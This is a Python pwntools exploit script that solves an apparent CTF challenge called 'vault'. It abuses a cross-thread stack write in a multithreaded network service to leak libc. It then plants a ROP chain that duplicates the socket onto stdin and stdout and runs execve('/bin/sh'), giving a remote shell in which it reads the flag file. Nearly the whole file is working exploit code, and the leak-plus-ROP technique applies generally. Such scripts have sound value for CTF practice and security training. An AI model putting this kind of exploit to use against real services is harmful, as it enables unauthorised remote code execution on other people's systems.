#!/usr/bin/env python3
from pwn import *
import time 
import sys

"""

"""

if len(sys.argv) < 3:
    print("Usage solve.py <host> <port>")
    exit(1)
_, host, port = sys.argv

context.terminal = ["tmux", "new-window"]
context.log_level = 'info'

exe = ELF("../dist/vault")
libc = ELF("../dist/libc.so.6")

context.binary = exe
io = None

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val): info(name+" = %#x" % val)
def sla(delim,line): return io.sendlineafter(delim,line)
def sl(line): return io.sendline(line)
def rcu(delim): return io.recvuntil(delim)
def rcv(number): return io.recv(number)
def rcvl(): return io.recvline()

def conn():
    global io
    if args.REMOTE:
        io = remote("", )
    else:
        io = remote(host,int(port))
    return io

def create(size,buffer):
    sla(b": ",b"1")
    sla(b"?\n",str(size).encode())
    sl(buffer)

def read():
    sla(b": ",b"2")
    content = rcvl()
    return content

def exit_():
    sla(b": ",b"3")
 
t1 = conn() # upper stack address
t2 = conn() # lower stack address (Thread to be used for the leak)

io = t1
rsp_t1 = 0x00007ffff7d84da0
target_t2 = 0x00007ffff7583d50-16 # read call return address
create(rsp_t1-target_t2,b"A"*16)

time.sleep(1)
io = t2
create(40,b"AZE") # trigger stack frames creation

io = t1
leak = unpack(read()[8:].strip(),"all")
logleak("Leak libc",leak)
libc.address = leak - 0xf81c7
logbase()

t3 = conn() # upper stack address
t4 = conn() # lower stack address (Thread to be used for the leak)

io = t4
rsp_t3 = 0x7ffff6d82dc0
target_t4 = 0x7ffff6581e00+16 # create_tem_return addr

# sla(b": ",b"1")
# sla(b"?\n",str(size).encode())

io = t3
rop = ROP([libc])

binsh = next(libc.search(b"/bin/sh\x00"))
ret = rop.find_gadget(['ret'])[0]
pop_rcx = rop.find_gadget(['pop rcx','ret'])[0]

rop.raw(ret)
rop.raw(ret)
rop.raw(ret)
rop.raw(pop_rcx) # bypass WTF broken addr in the stack
rop.raw(0xdead)
rop.dup2(4,0) # FD of the first thread
rop.dup2(4,1)
rop.execve(binsh,0,0)

#print(rop.dump())

pld = b"A"*8
#pld += b"BBBBBBBB"
pld += bytes(rop)

create(rsp_t3-target_t4,pld) # write ROP

time.sleep(2)
io = t4
sl(b"trigger") # trigger recv and return from function

io = t1 # get the shell with the first thread
#io.recvall(timeout=0.5)
time.sleep(1)
io.sendline(b"cat /flag*")
io.interactive()

"""
b*connection_handler+248
b*create_temp_vault+142
tel 0x7ffff6581e08
"""
